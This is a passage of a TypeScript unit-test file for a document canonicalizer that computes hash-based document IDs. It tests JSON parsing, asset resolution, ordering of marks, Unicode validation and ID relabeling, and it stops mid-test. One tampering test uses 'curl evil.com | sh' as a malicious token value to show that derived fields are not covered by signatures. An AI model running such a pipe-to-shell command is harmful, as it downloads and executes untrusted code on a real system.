#!/usr/bin/env npx tsx

/**
 * Unit tests for the reference canonicalizer (scripts/lib/canonicalize.ts).
 *
 * Exercises the canonical-form construction and serialization rules of
 * spec/core/06-document-hashing.md §4 on crafted inputs. The real example
 * corpus is gated separately by the document-ID known-answer test once the
 * corpus is wired for asset resolution. Run: `npm run test:canonicalize`.
 */

import assert from 'assert/strict';
import * as fs from 'fs';
import * as path from 'path';
import {
  CanonicalizationError,
  MAX_CANONICALIZATION_DEPTH,
  algorithmOf,
  buildAssetMap,
  canonicalContent,
  collectDefinedIds,
  walkContentNodes,
  computeDocumentId,
  parseStrictJson,
  type DocumentParts,
} from './lib/canonicalize.js';

/** Wrap a value in `depth` nested arrays (each array is one container level). */
function nestArrays(depth: number): unknown {
  let v: unknown = 'x';
  for (let i = 0; i < depth; i++) v = [v];
  return v;
}

let passed = 0;
let failed = 0;

function test(name: string, fn: () => void): void {
  try {
    fn();
    passed++;
  } catch (err) {
    failed++;
    console.error(`✗ ${name}`);
    console.error(`    ${err instanceof Error ? (err.stack ?? err.message) : String(err)}`);
  }
}

const HASH256 = (c: string) => `sha256:${c.repeat(64)}`;
const HASH512 = (c: string) => `sha512:${c.repeat(128)}`;

interface PartsInput {
  content: unknown | string;
  dublinCore?: unknown | string;
  manifestAssets?: unknown;
  assetIndexes?: Record<string, unknown>;
}

function makeParts(o: PartsInput): DocumentParts {
  return {
    manifest: JSON.stringify(o.manifestAssets !== undefined ? { assets: o.manifestAssets } : {}),
    content: typeof o.content === 'string' ? o.content : JSON.stringify(o.content),
    dublinCore:
      typeof o.dublinCore === 'string'
        ? o.dublinCore
        : JSON.stringify(o.dublinCore ?? { version: '1.1', terms: { title: 'T', creator: 'C' } }),
    assetIndexes: o.assetIndexes
      ? Object.fromEntries(Object.entries(o.assetIndexes).map(([k, v]) => [k, JSON.stringify(v)]))
      : undefined,
  };
}

/** Canonical content tree (the `content` slot) for a crafted content object. */
function canonContent(o: PartsInput): any {
  return (canonicalContent(makeParts(o)) as any).content;
}

/** Projected metadata slot for crafted Dublin Core. */
function canonMetadata(dublinCore: unknown): any {
  return (canonicalContent(makeParts({ content: { version: '0.1', blocks: [] }, dublinCore })) as any).metadata;
}

const IMAGE_ASSETS = {
  manifestAssets: { images: { count: 1, totalSize: 1, index: 'assets/images/index.json' } },
  assetIndexes: {
    images: {
      version: '0.1',
      assets: [{ id: 'fig', path: 'figure1.avif', type: 'image/avif', size: 1, hash: HASH256('a') }],
    },
  },
};

// ---------------------------------------------------------------------------
// parseStrictJson — duplicate-key rejection (§4.3.2 item 3)
// ---------------------------------------------------------------------------

test('parseStrictJson: valid object parses with JSON.parse value semantics', () => {
  assert.deepEqual(parseStrictJson('{"a":1,"b":[2,3],"c":{"d":1.5e3}}'), { a: 1, b: [2, 3], c: { d: 1500 } });
});

test('parseStrictJson: flat duplicate key rejected', () => {
  assert.throws(() => parseStrictJson('{"a":1,"a":2}'), CanonicalizationError);
});

test('parseStrictJson: nested duplicate key rejected', () => {
  assert.throws(() => parseStrictJson('{"x":{"a":1,"a":2}}'), CanonicalizationError);
});

test('parseStrictJson: duplicate key inside array element rejected', () => {
  assert.throws(() => parseStrictJson('[{"a":1,"a":2}]'), CanonicalizationError);
});

test('parseStrictJson: escape-equivalent duplicate key rejected ("a" vs "\\u0061")', () => {
  assert.throws(() => parseStrictJson('{"a":1,"\\u0061":2}'), CanonicalizationError);
});

test('parseStrictJson: same key name in sibling objects is allowed', () => {
  assert.deepEqual(parseStrictJson('{"a":{"k":1},"b":{"k":2}}'), { a: { k: 1 }, b: { k: 2 } });
});

test('parseStrictJson: a value string equal to a key name is not a duplicate', () => {
  assert.deepEqual(parseStrictJson('{"k":"k"}'), { k: 'k' });
});

test('parseStrictJson: key equal to a string value containing braces/colons is fine', () => {
  assert.deepEqual(parseStrictJson('{"a":"{\\"a\\":1}"}'), { a: '{"a":1}' });
});

// ---------------------------------------------------------------------------
// algorithmOf (§3.3)
// ---------------------------------------------------------------------------

test('algorithmOf: extracts the prefix', () => {
  assert.equal(algorithmOf(HASH256('a')), 'sha256');
  assert.equal(algorithmOf(HASH512('b')), 'sha512');
  assert.equal(algorithmOf('sha3-256:' + 'c'.repeat(64)), 'sha3-256');
});

test('algorithmOf: rejects pending / missing prefix / unknown algorithm', () => {
  assert.throws(() => algorithmOf('pending'), CanonicalizationError);
  assert.throws(() => algorithmOf(''), CanonicalizationError);
  assert.throws(() => algorithmOf('md5:' + 'a'.repeat(32)), CanonicalizationError);
});

// ---------------------------------------------------------------------------
// Metadata projection (§4.3.1; 08 §6)
// ---------------------------------------------------------------------------

test('metadata: keeps the five projected terms; scalars coerced to arrays', () => {
  const md = canonMetadata({
    version: '1.1',
    terms: { title: 'T', creator: 'Jane', subject: ['x', 'y'], description: 'D', language: 'en' },
  });
  assert.deepEqual(md, { title: 'T', creator: ['Jane'], subject: ['x', 'y'], description: 'D', language: ['en'] });
});

test('metadata: omits absent and wholly-empty terms', () => {
  const md = canonMetadata({
    version: '1.1',
    terms: { title: 'T', creator: 'C', subject: [], description: '', language: '' },
  });
  assert.deepEqual(md, { title: 'T', creator: ['C'] });
});

test('metadata: drops creators and all non-projected terms', () => {
  const md = canonMetadata({
    version: '1.1',
    terms: {
      title: 'T',
      creator: 'C',
      creators: [{ name: 'C', orcid: '0000-0001-2345-6789' }],
      date: '2025-01-01',
      publisher: 'P',
      type: 'Text',
      format: 'application/vnd.cdx+json',
      identifier: 'sha256:x',
      rights: 'all',
    },
  });
  assert.deepEqual(md, { title: 'T', creator: ['C'] });
});

test('metadata: array element order is preserved verbatim', () => {
  const md = canonMetadata({ version: '1.1', terms: { title: 'T', creator: ['Z', 'A', 'M'] } });
  assert.deepEqual(md.creator, ['Z', 'A', 'M']);
});

test('metadata: authored term order does not affect the projection', () => {
  const a = canonMetadata({ version: '1.1', terms: { creator: 'C', title: 'T' } });
  const b = canonMetadata({ version: '1.1', terms: { title: 'T', creator: 'C' } });
  assert.deepEqual(a, b);
});

test('metadata: empty when no projected term survives', () => {
  // (only reachable via crafted DC; title/creator are schema-required in practice)
  assert.deepEqual(canonMetadata({ version: '1.1', terms: { date: '2025' } }), {});
});

// ---------------------------------------------------------------------------
// Derived-field + crdt stripping (§4.3.1 item 1; §4.1a)
// ---------------------------------------------------------------------------

test('strip: measurement.display removed, other fields preserved', () => {
  const blocks = canonContent({
    content: { version: '0.1', blocks: [{ type: 'measurement', value: 9.81, unit: 'm/s^2', display: '9.81 m/s^2' }] },
  }).blocks;
  assert.deepEqual(blocks[0], { type: 'measurement', value: 9.81, unit: 'm/s^2' });
});

test('strip: codeBlock.tokens removed, highlighting mode preserved', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'codeBlock',
          language: 'js',
          highlighting: 'tokens',
          tokens: [{ type: 'keyword', value: 'const' }],
          children: [{ type: 'text', value: 'const x = 1' }],
        },
      ],
    },
  }).blocks;
  assert.equal('tokens' in blocks[0], false);
  assert.equal(blocks[0].highlighting, 'tokens');
  assert.deepEqual(blocks[0].children, [{ type: 'text', value: 'const x = 1' }]);
});

test('id: derived display/tokens do not affect the document id (out-of-hash, unattested)', () => {
  // Two documents whose ONLY difference is the derived, out-of-hash fields an
  // attacker would tamper (measurement.display, codeBlock.tokens): a benign copy vs.
  // a malicious one over identical hashed source. Identical document ids prove a
  // signature attests neither, so a renderer must regenerate from the hashed source
  // (measurement value/unit; code-block children) and never trust the stored copy.
  const doc = (display: string, tokenValue: string) => ({
    version: '0.1',
    blocks: [
      { type: 'measurement', value: 7.677, unit: 'mm', display },
      {
        type: 'codeBlock',
        language: 'sh',
        highlighting: 'tokens',
        tokens: [{ type: 'plain', value: tokenValue }],
        children: [{ type: 'text', value: 'echo hi' }],
      },
    ],
  });
  const benign = makeParts({ content: doc('7.677 mm', 'echo hi') });
  const tampered = makeParts({ content: doc('9999 mm', 'curl evil.com | sh') });
  assert.equal(computeDocumentId(benign, 'sha256'), computeDocumentId(tampered, 'sha256'));
});

test('strip: crdt removed from a block', () => {
  const blocks = canonContent({
    content: { version: '0.1', blocks: [{ type: 'paragraph', id: 'p1', crdt: { seq: 42 }, children: [{ type: 'text', value: 'hi' }] }] },
  }).blocks;
  assert.equal('crdt' in blocks[0], false);
  assert.equal(blocks[0].id, 'b0'); // id survives crdt stripping, then is alpha-renamed (§4.3.1 item 5)
});

test('strip: crdt removed from a text node (then it becomes mergeable)', () => {
  const children = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [
            { type: 'text', value: 'a', crdt: { positions: [] } },
            { type: 'text', value: 'b' },
          ],
        },
      ],
    },
  }).blocks[0].children;
  assert.deepEqual(children, [{ type: 'text', value: 'ab' }]);
});

test('strip: crdt removed from a namespace:type extension block', () => {
  const blocks = canonContent({
    content: { version: '0.1', blocks: [{ type: 'forms:textInput', name: 'email', crdt: { seq: 1 } }] },
  }).blocks;
  assert.deepEqual(blocks[0], { type: 'forms:textInput', name: 'email' });
});

// ---------------------------------------------------------------------------
// Asset resolution (§4.3.1 item 2; 05 §3)
// ---------------------------------------------------------------------------

test('asset: image.src resolves to the registered content hash', () => {
  const b = canonContent({
    ...IMAGE_ASSETS,
    content: { version: '0.1', blocks: [{ type: 'image', src: 'assets/images/figure1.avif', alt: 'x' }] },
  }).blocks;
  assert.equal(b[0].src, HASH256('a'));
});

test('asset: svg.src resolves; inline svg content is untouched', () => {
  const resolved = canonContent({
    ...IMAGE_ASSETS,
    content: { version: '0.1', blocks: [{ type: 'svg', src: 'assets/images/figure1.avif', alt: 'x' }] },
  }).blocks[0];
  assert.equal(resolved.src, HASH256('a'));

  const inline = canonContent({
    content: { version: '0.1', blocks: [{ type: 'svg', content: '<svg/>', alt: 'x' }] },
  }).blocks[0];
  assert.deepEqual(inline, { type: 'svg', content: '<svg/>', alt: 'x' });
});

test('asset: signature.image resolves; digitalSignatureRef is left verbatim', () => {
  const sig = canonContent({
    ...IMAGE_ASSETS,
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'signature',
          signatureType: 'digital',
          image: 'assets/images/figure1.avif',
          digitalSignatureRef: 'security/signatures.json#sig-1',
        },
      ],
    },
  }).blocks[0];
  assert.equal(sig.image, HASH256('a'));
  assert.equal(sig.digitalSignatureRef, 'security/signatures.json#sig-1');
});

test('asset: link mark href resolves to a content hash', () => {
  const marks = canonContent({
    manifestAssets: { embeds: { count: 1, totalSize: 1, index: 'assets/embeds/index.json' } },
    assetIndexes: {
      embeds: { version: '0.1', assets: [{ id: 'd', path: 'data.xlsx', type: 'application/octet-stream', size: 1, hash: HASH256('b') }] },
    },
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [{ type: 'text', value: 'dl', marks: [{ type: 'link', href: 'assets/embeds/data.xlsx', title: 'd' }] }],
        },
      ],
    },
  }).blocks[0].children[0].marks;
  assert.deepEqual(marks, [{ type: 'link', href: HASH256('b'), title: 'd' }]);
});

test('asset: carve-outs (#anchor, URL scheme, external) are left verbatim', () => {
  const anchor = canonContent({
    content: {
      version: '0.1',
      blocks: [{ type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '#sec1' }] }] }],
    },
  }).blocks[0].children[0].marks[0];
  assert.equal(anchor.href, '#sec1');

  const url = canonContent({
    content: { version: '0.1', blocks: [{ type: 'image', src: 'https://example.com/a.png', alt: 'x' }] },
  }).blocks[0];
  assert.equal(url.src, 'https://example.com/a.png');

  const external = canonContent({
    content: { version: '0.1', blocks: [{ type: 'image', src: 'assets/images/missing.png', external: true, alt: 'x' }] },
  }).blocks[0];
  assert.equal(external.src, 'assets/images/missing.png');
});

test('asset: an unregistered assets/ reference is a canonicalization error', () => {
  assert.throws(
    () =>
      canonContent({
        ...IMAGE_ASSETS,
        content: { version: '0.1', blocks: [{ type: 'image', src: 'assets/images/missing.png', alt: 'x' }] },
      }),
    CanonicalizationError,
  );
});

test('asset: a non-assets/ relative reference is left verbatim', () => {
  const href = canonContent({
    content: {
      version: '0.1',
      blocks: [{ type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: 'chapter2.html' }] }] }],
    },
  }).blocks[0].children[0].marks[0].href;
  assert.equal(href, 'chapter2.html');
});

test('asset: a category in manifest.assets with no supplied index throws', () => {
  assert.throws(
    () =>
      canonicalContent({
        manifest: JSON.stringify({ assets: { images: { count: 1, totalSize: 1, index: 'assets/images/index.json' } } }),
        content: JSON.stringify({ version: '0.1', blocks: [] }),
        dublinCore: JSON.stringify({ version: '1.1', terms: { title: 'T', creator: 'C' } }),
      }),
    CanonicalizationError,
  );
});

test('asset: a malformed registered hash is rejected', () => {
  assert.throws(
    () =>
      canonContent({
        manifestAssets: { images: { count: 1, totalSize: 1, index: 'assets/images/index.json' } },
        assetIndexes: {
          images: { version: '0.1', assets: [{ id: 'f', path: 'f.png', type: 'image/png', size: 1, hash: 'sha256:XYZ' }] },
        },
        content: { version: '0.1', blocks: [{ type: 'image', src: 'assets/images/f.png', alt: 'x' }] },
      }),
    CanonicalizationError,
  );
});

// ---------------------------------------------------------------------------
// Marks normalization (§4.3.1 item 3)
// ---------------------------------------------------------------------------

test('marks: bare string marks sort before structured object marks; sorted + deduped', () => {
  const marks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [
            {
              type: 'text',
              value: 'x',
              marks: [{ type: 'link', href: 'https://a' }, 'italic', 'bold', 'bold'],
            },
          ],
        },
      ],
    },
  }).blocks[0].children[0].marks;
  assert.deepEqual(marks, ['bold', 'italic', { type: 'link', href: 'https://a' }]);
});

test('marks: an empty marks array is omitted (absent ≡ [])', () => {
  const node = canonContent({
    content: { version: '0.1', blocks: [{ type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [] }] }] },
  }).blocks[0].children[0];
  assert.deepEqual(node, { type: 'text', value: 'x' });
});

test('marks: link hrefs resolve before dedup (same hash collapses two links)', () => {
  const marks = canonContent({
    manifestAssets: { embeds: { count: 1, totalSize: 1, index: 'assets/embeds/index.json' } },
    assetIndexes: {
      embeds: {
        version: '0.1',
        assets: [
          { id: 'a', path: 'a.bin', type: 'application/octet-stream', size: 1, hash: HASH256('c') },
          { id: 'b', path: 'b.bin', type: 'application/octet-stream', size: 1, hash: HASH256('c') },
        ],
      },
    },
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [
            {
              type: 'text',
              value: 'x',
              marks: [
                { type: 'link', href: 'assets/embeds/a.bin' },
                { type: 'link', href: 'assets/embeds/b.bin' },
              ],
            },
          ],
        },
      ],
    },
  }).blocks[0].children[0].marks;
  assert.deepEqual(marks, [{ type: 'link', href: HASH256('c') }]);
});

// ---------------------------------------------------------------------------
// Text-node merge (§4.3.1 item 4)
// ---------------------------------------------------------------------------

test('merge: adjacent text nodes with equal mark-sets merge; differing marks do not', () => {
  const children = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [
            { type: 'text', value: 'Hello ' },
            { type: 'text', value: 'brave ' },
            { type: 'text', value: 'world', marks: ['bold'] },
          ],
        },
      ],
    },
  }).blocks[0].children;
  assert.deepEqual(children, [
    { type: 'text', value: 'Hello brave ' },
    { type: 'text', value: 'world', marks: ['bold'] },
  ]);
});

test('merge: a text node carrying an id is a boundary; its id is preserved verbatim, not relabeled', () => {
  const children = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [
            { type: 'text', value: 'a', id: 'anchor1' },
            { type: 'text', value: 'b' },
          ],
        },
      ],
    },
  }).blocks[0].children;
  // §4.3.1 item 4: a text node with an id is preserved unchanged and acts as a
  // boundary. A text-node id is NOT in the relabeled namespace (item 5), so it
  // stays 'anchor1' — never rewritten to a canonical b<N> name.
  assert.deepEqual(children, [
    { type: 'text', value: 'a', id: 'anchor1' },
    { type: 'text', value: 'b' },
  ]);
});

test('merge: a non-text inline child breaks the run', () => {
  const children = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [
            { type: 'text', value: 'a' },
            { type: 'break' },
            { type: 'text', value: 'b' },
          ],
        },
      ],
    },
  }).blocks[0].children;
  assert.deepEqual(children, [{ type: 'text', value: 'a' }, { type: 'break' }, { type: 'text', value: 'b' }]);
});

// ---------------------------------------------------------------------------
// Preservation (§4.3.1 item 5)
// ---------------------------------------------------------------------------

test('preserve: null is distinct from absent; schema defaults are not materialized', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'listItem', checked: null, children: [] },
        { type: 'table', children: [{ type: 'tableRow', children: [{ type: 'tableCell', children: [] }] }] },
      ],
    },
  }).blocks;
  assert.equal('checked' in blocks[0], true);
  assert.equal(blocks[0].checked, null);
  // colspan/rowspan defaults (1) must NOT be materialized
  assert.deepEqual(blocks[1].children[0].children[0], { type: 'tableCell', children: [] });
});

// ---------------------------------------------------------------------------
// Stored-byte invariant validation (§4.3.2)
// ---------------------------------------------------------------------------

test('validate: non-NFC string is rejected (never silently normalized)', () => {
  const nfd = 'cafe\u0301'; // 'e' + U+0301 combining acute; NFC form ends in U+00E9
  assert.notEqual(nfd, nfd.normalize('NFC')); // guard: this string really is non-NFC
  assert.throws(
    () => canonContent({ content: { version: '0.1', blocks: [{ type: 'text', value: nfd }] } }),
    CanonicalizationError,
  );
});

test('validate: NFC string passes and is left byte-identical', () => {
  const nfc = 'caf\u00e9'; // precomposed e-acute (U+00E9)
  assert.equal(nfc, nfc.normalize('NFC')); // guard: this string really is NFC
  const v = canonContent({ content: { version: '0.1', blocks: [{ type: 'text', value: nfc }] } }).blocks[0].value;
  assert.equal(v, nfc);
});

test('validate: an unpaired surrogate is rejected (well-formed Unicode)', () => {
  assert.throws(
    () => canonContent({ content: { version: '0.1', blocks: [{ type: 'text', value: '\uD83D' }] } }),
    CanonicalizationError,
  );
});

test('validate: an integer beyond 2^53-1 is rejected', () => {
  assert.throws(
    () => canonContent({ content: JSON.stringify({ version: '0.1', blocks: [{ type: 'measurement', value: 9007199254740992, display: 'x' }] }) }),
    CanonicalizationError,
  );
});

test('validate: a safe integer and an ordinary float pass', () => {
  const blocks = canonContent({
    content: { version: '0.1', blocks: [{ type: 'measurement', value: 9007199254740991, display: 'x' }, { type: 'measurement', value: 1.5e-10, display: 'y' }] },
  }).blocks;
  assert.equal(blocks[0].value, 9007199254740991);
  assert.equal(blocks[1].value, 1.5e-10);
});

test('validate: validation can be disabled for inspection', () => {
  const nfd = 'cafe\u0301';
  const v = canonicalContent(makeParts({ content: { version: '0.1', blocks: [{ type: 'text', value: nfd }] } }), { validate: false }) as any;
  assert.equal(v.content.blocks[0].value, nfd); // returned un-normalized, exactly as input
});

// ---------------------------------------------------------------------------
// computeDocumentId (§4.4)
// ---------------------------------------------------------------------------

test('id: deterministic and prefixed with the algorithm', () => {
  const p = makeParts({ content: { version: '0.1', blocks: [{ type: 'text', value: 'hi' }] } });
  const a = computeDocumentId(p, 'sha256');
  const b = computeDocumentId(p, 'sha256');
  assert.equal(a, b);
  assert.match(a, /^sha256:[0-9a-f]{64}$/);
});

test('id: authored field/term order does not change the id', () => {
  const p1 = makeParts({
    content: { version: '0.1', blocks: [{ type: 'heading', level: 1, children: [{ type: 'text', value: 'H' }] }] },
    dublinCore: { version: '1.1', terms: { creator: 'C', title: 'T' } },
  });
  const p2 = makeParts({
    content: { version: '0.1', blocks: [{ level: 1, children: [{ value: 'H', type: 'text' }], type: 'heading' }] },
    dublinCore: { version: '1.1', terms: { title: 'T', creator: 'C' } },
  });
  assert.equal(computeDocumentId(p1, 'sha256'), computeDocumentId(p2, 'sha256'));
});

test('id: a sha512 asset hash is spliced verbatim into a sha256 document', () => {
  const p = makeParts({
    manifestAssets: { images: { count: 1, totalSize: 1, index: 'assets/images/index.json' } },
    assetIndexes: { images: { version: '0.1', assets: [{ id: 'f', path: 'f.png', type: 'image/png', size: 1, hash: HASH512('b') }] } },
    content: { version: '0.1', blocks: [{ type: 'image', src: 'assets/images/f.png', alt: 'x' }] },
  });
  const tree = (canonicalContent(p) as any).content;
  assert.equal(tree.blocks[0].src, HASH512('b'));
  assert.match(computeDocumentId(p, 'sha256'), /^sha256:[0-9a-f]{64}$/);
});

test('id: blake3 (no Node implementation) throws a typed error', () => {
  const p = makeParts({ content: { version: '0.1', blocks: [] } });
  assert.throws(() => computeDocumentId(p, 'blake3'), CanonicalizationError);
});

// ---------------------------------------------------------------------------
// Asset purity (rename a referenced file; same bytes => same id)
// ---------------------------------------------------------------------------

test('purity: same content + same asset bytes under a different filename => same id', () => {
  const mk = (filename: string) =>
    makeParts({
      manifestAssets: { images: { count: 1, totalSize: 1, index: 'assets/images/index.json' } },
      assetIndexes: { images: { version: '0.1', assets: [{ id: 'fig', path: filename, type: 'image/png', size: 1, hash: HASH256('d') }] } },
      content: { version: '0.1', blocks: [{ type: 'image', src: `assets/images/${filename}`, alt: 'x' }] },
    });
  assert.equal(computeDocumentId(mk('original.png'), 'sha256'), computeDocumentId(mk('renamed.png'), 'sha256'));
});

// ---------------------------------------------------------------------------
// End-to-end against a real (asset-free) example
// ---------------------------------------------------------------------------

test('e2e: simple-document canonicalizes to a stable id', () => {
  const dir = path.join(__dirname, '..', 'examples', 'simple-document');
  const p: DocumentParts = {
    manifest: fs.readFileSync(path.join(dir, 'manifest.json'), 'utf8'),
    content: fs.readFileSync(path.join(dir, 'content', 'document.json'), 'utf8'),
    dublinCore: fs.readFileSync(path.join(dir, 'metadata', 'dublin-core.json'), 'utf8'),
  };
  const id1 = computeDocumentId(p, 'sha256');
  const id2 = computeDocumentId(p, 'sha256');
  assert.equal(id1, id2);
  assert.match(id1, /^sha256:[0-9a-f]{64}$/);
  console.log(`    simple-document id = ${id1}`);
});

// ---------------------------------------------------------------------------
// Determinism seams + regression guards
// ---------------------------------------------------------------------------

test('marks: sort uses UTF-16 code-unit order (astral mark sorts before a U+FFFF mark)', () => {
  // U+10000 encodes as 0xD800 0xDC00; 0xD800 < 0xFFFF, so under JCS UTF-16
  // code-unit order the astral href sorts first (code-point order would reverse it).
  const marks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '\uFFFF' }, { type: 'link', href: '\uD800\uDC00' }] }],
        },
      ],
    },
  }).blocks[0].children[0].marks;
  assert.equal(marks[0].href, '\uD800\uDC00');
  assert.equal(marks[1].href, '\uFFFF');
});

test('asset: conflicting hashes for one archive path are rejected', () => {
  assert.throws(
    () =>
      canonContent({
        manifestAssets: { images: { count: 2, totalSize: 2, index: 'assets/images/index.json' } },
        assetIndexes: {
          images: {
            version: '0.1',
            assets: [
              { id: 'a', path: 'dup.png', type: 'image/png', size: 1, hash: HASH256('a') },
              { id: 'b', path: 'dup.png', type: 'image/png', size: 1, hash: HASH256('b') },
            ],
          },
        },
        content: { version: '0.1', blocks: [] },
      }),
    CanonicalizationError,
  );
});

test('asset: a src with ./ or ../ segments is normalized before resolving', () => {
  const b = canonContent({
    ...IMAGE_ASSETS,
    content: { version: '0.1', blocks: [{ type: 'image', src: 'assets/images/sub/../figure1.avif', alt: 'x' }] },
  }).blocks;
  assert.equal(b[0].src, HASH256('a'));
});

test('asset/marks: transforms apply inside a namespace:type extension block', () => {
  const block = canonContent({
    manifestAssets: { embeds: { count: 1, totalSize: 1, index: 'assets/embeds/index.json' } },
    assetIndexes: {
      embeds: { version: '0.1', assets: [{ id: 'd', path: 'data.bin', type: 'application/octet-stream', size: 1, hash: HASH256('e') }] },
    },
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'forms:field',
          label: 'see',
          children: [{ type: 'text', value: 'link', marks: [{ type: 'link', href: 'assets/embeds/data.bin' }] }],
        },
      ],
    },
  }).blocks[0];
  assert.equal(block.children[0].marks[0].href, HASH256('e'));
});

test('id: -0 serializes as 0 (id-equal to a plain 0)', () => {
  const neg = makeParts({ content: '{"version":"0.1","blocks":[{"type":"measurement","value":-0,"display":"x"}]}' });
  const pos = makeParts({ content: '{"version":"0.1","blocks":[{"type":"measurement","value":0,"display":"x"}]}' });
  assert.equal(computeDocumentId(neg, 'sha256'), computeDocumentId(pos, 'sha256'));
});

test('parse: a duplicate key in the manifest is rejected end-to-end', () => {
  assert.throws(
    () =>
      canonicalContent({
        manifest: '{"assets":{},"assets":{}}',
        content: JSON.stringify({ version: '0.1', blocks: [] }),
        dublinCore: JSON.stringify({ version: '1.1', terms: { title: 'T', creator: 'C' } }),
      }),
    CanonicalizationError,
  );
});

test('parse: a duplicate key in Dublin Core is rejected end-to-end', () => {
  assert.throws(
    () =>
      canonicalContent({
        manifest: '{}',
        content: JSON.stringify({ version: '0.1', blocks: [] }),
        dublinCore: '{"version":"1.1","terms":{"title":"A","title":"B","creator":"C"}}',
      }),
    CanonicalizationError,
  );
});

test('parse: a duplicate key in an asset index is rejected end-to-end', () => {
  assert.throws(
    () =>
      canonicalContent({
        manifest: JSON.stringify({ assets: { images: { count: 1, totalSize: 1, index: 'assets/images/index.json' } } }),
        content: JSON.stringify({ version: '0.1', blocks: [] }),
        dublinCore: JSON.stringify({ version: '1.1', terms: { title: 'T', creator: 'C' } }),
        assetIndexes: { images: '{"version":"0.1","assets":[],"assets":[]}' },
      }),
    CanonicalizationError,
  );
});

test('asset: an aliasOf entry carrying its own path+hash still resolves', () => {
  const blocks = canonContent({
    manifestAssets: { images: { count: 2, totalSize: 2, index: 'assets/images/index.json' } },
    assetIndexes: {
      images: {
        version: '0.1',
        assets: [
          { id: 'logo', path: 'logo.png', type: 'image/png', size: 1, hash: HASH256('a') },
          { id: 'logo-copy', aliasOf: 'logo', path: 'logo-copy.png', type: 'image/png', size: 1, hash: HASH256('a') },
        ],
      },
    },
    content: { version: '0.1', blocks: [{ type: 'image', src: 'assets/images/logo-copy.png', alt: 'x' }] },
  }).blocks;
  assert.equal(blocks[0].src, HASH256('a'));
});

// ---------------------------------------------------------------------------
// Alpha-renaming of block/anchor/sub-block ids (§4.3.1 item 5)
// ---------------------------------------------------------------------------

test('relabel: block ids are assigned b0,b1,… in document order', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'heading', id: 'title', level: 1, children: [{ type: 'text', value: 'T' }] },
        { type: 'paragraph', id: 'intro', children: [{ type: 'text', value: 'p' }] },
        { type: 'horizontalRule', id: 'rule' },
      ],
    },
  }).blocks;
  assert.deepEqual([blocks[0].id, blocks[1].id, blocks[2].id], ['b0', 'b1', 'b2']);
});

test('relabel: a nested block id follows its parent in document order', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'blockquote', id: 'outer', children: [{ type: 'paragraph', id: 'inner', children: [{ type: 'text', value: 'x' }] }] },
        { type: 'paragraph', id: 'after', children: [{ type: 'text', value: 'y' }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[0].id, 'b0'); // outer
  assert.equal(blocks[0].children[0].id, 'b1'); // inner (after its parent)
  assert.equal(blocks[1].id, 'b2'); // after
});

test('relabel: a link href #blockId is rewritten to the canonical name', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'heading', id: 'sec', level: 1, children: [{ type: 'text', value: 'S' }] },
        { type: 'paragraph', children: [{ type: 'text', value: 'see', marks: [{ type: 'link', href: '#sec' }] }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[1].children[0].marks[0].href, '#b0');
});

test('relabel: a #ref preserves its /offset suffix; an unresolved #ref is left verbatim', () => {
  const children = canonContent({
    content: {
      version: '0.1',
      blocks: [
        {
          type: 'paragraph',
          id: 'sec',
          children: [
            { type: 'text', value: 'a', marks: [{ type: 'link', href: '#sec/10-25' }] },
            { type: 'text', value: 'b', marks: [{ type: 'link', href: '#ghost' }] },
          ],
        },
      ],
    },
  }).blocks[0].children;
  assert.equal(children[0].marks[0].href, '#b0/10-25'); // id rewritten, offset preserved
  assert.equal(children[1].marks[0].href, '#ghost'); // unresolved → verbatim (no error)
});

test('relabel: an anchor mark id is relabeled and a #ref to it is rewritten consistently', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'paragraph', children: [{ type: 'text', value: 'point', marks: [{ type: 'anchor', id: 'pt' }] }] },
        { type: 'paragraph', children: [{ type: 'text', value: 'ref', marks: [{ type: 'link', href: '#pt' }] }] },
      ],
    },
  }).blocks;
  assert.equal(blocks[0].children[0].marks[0].id, 'b0'); // anchor mark id (the only def) → b0
  assert.equal(blocks[1].children[0].marks[0].href, '#b0'); // link to it rewritten
});

test('relabel: a marks array is re-sorted after rewriting (so output stays JCS-ordered)', () => {
  // m is defined before k → m=b0, k=b1. The node lists links href-sorted as
  // [#k, #m] (#k<#m); after rewrite to [#b1, #b0] they MUST be re-sorted to [#b0,#b1].
  const marks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'heading', id: 'm', level: 1, children: [{ type: 'text', value: 'M' }] },
        { type: 'heading', id: 'k', level: 1, children: [{ type: 'text', value: 'K' }] },
        { type: 'paragraph', children: [{ type: 'text', value: 'x', marks: [{ type: 'link', href: '#k' }, { type: 'link', href: '#m' }] }] },
      ],
    },
  }).blocks[2].children[0].marks;
  assert.deepEqual(marks, [{ type: 'link', href: '#b0' }, { type: 'link', href: '#b1' }]);
});

test('relabel: academic uses/of/target rewrite to block and equation-line ids', () => {
  const blocks = canonContent({
    content: {
      version: '0.1',
      blocks: [
        { type: 'academic:theorem', id: 'def1', variant: 'definition', children: [] },
        { type: 'academic:theorem', id: 'thm1', variant: 'theorem', uses: ['#def1'], children: [] },
        { type: 'academic:proof', of: '#thm1', children: [] },
